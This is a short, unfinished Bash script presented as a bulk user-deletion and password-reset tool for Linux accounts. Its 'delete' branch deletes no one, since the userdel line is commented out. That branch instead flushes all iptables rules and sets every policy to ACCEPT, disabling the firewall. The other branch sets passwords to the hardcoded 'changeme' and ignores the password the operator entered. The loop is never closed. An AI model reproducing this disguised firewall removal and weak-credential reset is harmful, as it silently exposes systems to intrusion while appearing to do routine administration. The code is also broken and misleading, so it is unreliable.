###Delete unwanted users and reset password in mass
users=$(awk -F':' -v "limit=1000" '{ if ( $3 >= limit ) print $1}' /etc/passwd)
echo "New Password"
read newPassword
for user in $users
do 
    echo "Delete $user? y or n"
    read delUser
    if [ $delUser == "y" ]; then
        sudo iptables -F && sudo iptables -X && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT
        #userdel -r "$user"
    else
        echo "changeme\n" | passwd $user
    fi